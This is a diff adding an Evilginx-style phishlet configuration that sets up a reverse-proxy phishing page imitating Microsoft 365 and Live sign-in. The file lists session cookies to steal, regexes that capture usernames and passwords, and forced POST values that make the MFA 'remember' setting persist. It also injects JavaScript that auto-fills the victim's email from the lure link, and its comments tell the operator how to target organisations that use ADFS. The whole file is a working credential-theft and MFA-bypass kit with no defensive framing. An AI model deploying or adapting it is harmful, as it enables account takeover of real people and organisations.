@@ -1,0 +1,134 @@
+name: '222'
+author: '@gytee'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing:false}
+  # The lines below are needed if your target organization utilizes ADFS.
+  # If they do, you need to uncomment all following lines that contain <...>
+  # To get the correct ADFS subdomain, test the web login manually and check where you are redirected.
+  # Assuming you get redirected to adfs.example.com, the placeholders need to be filled out as followed:
+  #    <insert-adfs-subdomain> = adfs
+  #    <insert-adfs-host> = example.com
+  #    <insert-adfs-subdomain-and-host> = adfs.example.com
+  #- {phish_sub: 'adfs', orig_sub: '<insert-adfs-subdomain>', domain: '<insert-adfs-host>', session: true, is_landing:false}
+  #- {phish_sub: 'adfs', orig_sub: '<insert-adfs-subdomain>', domain: '<insert-adfs-host>:443', session: true, is_landing:false}
+sub_filters:
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  # Uncomment and fill in if your target organization utilizes ADFS
+  #- {triggers_on: '<insert-adfs-subdomain-and-host>', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+auth_tokens:
+  - domain: '.office.com'
+    keys: ['.*,regexp']
+    type: 'cookie'
+  - domain: 'www.office.com'
+    keys: ['.*,regexp']
+    type: 'cookie' 
+  - domain: '.login.live.com'
+    keys: ['uaid:always','MSPRequ:always','MSCC:always','MSPOK:always','__Host-MSAAUTHP:always','MSPPre:opt','MSPCID:always','MSPAuth:always','MSPProf:opt','NAP:always','ANON:always','WLSSC:always','SDIDC:always','JSHP:always','JSH:always','MSPSoftVis:opt','OParams:always','MSPBack:always']
+    type: 'cookie'
+  - domain: 'login.live.com'
+    keys: ['ai_session:always','MicrosoftApplicationsTelemetryDeviceId:always','MSFPC:always','__Host-MSAAUTH:always']
+    type: 'cookie'
+  - domain: '.live.com'
+    keys: ['wlidperf:always','PPLState:always','WLSSC:always','RPSSecAuth:always','MSPCID:always','MSPAuth:always','MSPProf:opt','NAP:always','ANON:always']
+    type: 'cookie'
+  - domain: '.live.com'
+    path: '/'
+    name: 'ai_session'
+    header: 'ai_session'
+    type: 'http'
+  - domain: '.login.microsoftonline.com'
+    keys: ['ESTSAUTH:always','ESTSAUTHPERSISTENT:always','SignInStateCookie:always','esctx:always','ESTSSC:always','ESTSAUTHLIGHT:always','stsservicecookie:always','x-ms-gateway-slice:always']
+    type: 'cookie'
+  - domain: 'login.microsoftonline.com'
+    keys: ['ESTSSC:always','ESTSAUTHLIGHT:always','stsservicecookie:always','x-ms-gateway-slice:always']
+    type: 'cookie'
+force_post:
+  - path: '/ppsecure/post*'
+    search:
+      - {key: 'LoginOptions', search: '1'}
+    force:
+      - {key: 'DontShowAgain', value: 'true'}
+    type: 'post'
+  - path: '/kmsi'
+    search: 
+      - {key: 'LoginOptions', search: '.*'}
+    force:
+      - {key: 'LoginOptions', value: '1'}
+    type: 'post'
+  - path: '/common/SAS'
+    search: 
+      - {key: 'rememberMFA', search: '.*'}
+    force:
+      - {key: 'rememberMFA', value: 'true'}
+    type: 'post'
+auth_urls:
+  - '/kmsi' 
+  - '/common/SAS/ProcessAuth'
+  - '/?auth=1'
+  - '/landingv2'
+credentials:
+  username:
+    key: '(login|UserName|username|email|account)'
+    search: '"username":"([^"]*)'
+    type: 'json'
+  password:
+    key: '(passwd|Password|password|login_password|pass|pwd|session_password|PASSWORD)'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    - key: "(login|UserName|username|email|account)"
+      search: '"username":"([^"]*)'
+      type: "json"  
+    - key: "(passwd|Password|password|login_password|pass|pwd|session_password|PASSWORD)"
+      search: '"password":"([^"]*)'
+      type: "json"
+login:
+  domain: 'login.microsoftonline.com'
+  path: '/'
+# Auto fill email. Use by appending #{email} to lure link e.g. https://phish.com/lure#example@gmail.com
+js_inject:
+  - trigger_domains: ["login.microsoftonline.com", "login.live.com"]
+    trigger_paths: ["/common/oauth2/v2.0/authorize*", "/", "/*"]
+    script: |
+      function lp() {
+        // Select the email input field and "Next" button
+        var emailId = document.querySelector("#i0116");
+        var nextButton = document.querySelector("#idSIButton9");
+        var query = window.location.href;
+
+        // Check if the URL contains a fragment (#)
+        if (/#/.test(window.location.href)) {
+          var res = query.split("#");
+          var data1 = res[0];
+          var data2 = res[1];
+          console.log(data1);
+          console.log(data2);
+
+          // If the email input field is found
+          if (emailId != null) {
+            // Use data2 directly as the email address, trim any extra spaces, and remove any trailing equal signs
+            var emailAddress = data2.trim().replace(/=*$/, '');
+
+            // Focus on the email input field, set its value, and click the "Next" button
+            emailId.focus();
+            emailId.value = emailAddress;
+            nextButton.focus();
+            nextButton.click();
+            console.log("YES!");
+            return;
+          }
+        }
+
+        // Retry the lp function every 500 milliseconds if the email input field is not found
+        setTimeout(function() { lp(); }, 500);
+      }
+
+      // Initial timeout to invoke the lp function after 500 milliseconds
+      setTimeout(function() { lp(); }, 500); 
+intercept:
+  - {domain: 'privacynotice.account.microsoft.com', path: '^\/notice\?ru=https:\/\/login\.live\.com\/oauth20_authorize\.srf.*', http_status: 200, body: 'privacynotice.account.microsoft.com/notice?ru=https://login.live.com/oauth20_authorize.srf.*', mime: "text/html", "text/javascript", "application/json"}
+  - {domain: 'privacynotice.account.microsoft.com', path: '^\/notice\?ru=https:\/\/login\.live\.com\/oauth20_authorize\.srf.*', http_status: 200, body: 'privacynotice.account.microsoft.com/notice?ru=https://login.live.com/oauth20_authorize.srf.*', mime: "text/html", "text/javascript", "application/json"}
+  - {domain: 'ucis.msdxcdn.microsoft.com', path: '^\/.*\/app\.js', http_status: 200}
